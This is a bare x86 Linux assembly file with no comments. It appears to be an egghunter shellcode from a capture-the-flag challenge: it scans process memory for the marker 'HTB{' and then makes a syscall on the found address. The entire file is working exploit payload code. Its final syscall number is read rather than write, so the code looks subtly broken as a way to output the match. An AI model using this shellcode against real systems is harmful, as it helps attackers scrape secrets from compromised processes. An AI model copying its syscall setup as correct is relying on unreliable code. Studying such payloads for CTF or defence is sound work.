BITS 32					;

global _start

section .text

_start:
	mov ebx, 0x7b425448	;
	xor ecx, ecx		;
	mul ecx				;

next_page:
	or edx, 0xfff		;

text_next:
	inc edx				;
	pushad				;
	lea ebx, [edx+0x4]	;
	mov al, 0x21		;
	int 0x80			;
	cmp al, 0xf2		;
	popad				;
	jz next_page		;
	cmp [edx], ebx		;
	jnz text_next		;

	mov eax, 0x3		;
	mov ebx, 0x1 		;
	mov ecx, edx		;
	mov edx, 35			;
	int 0x80			;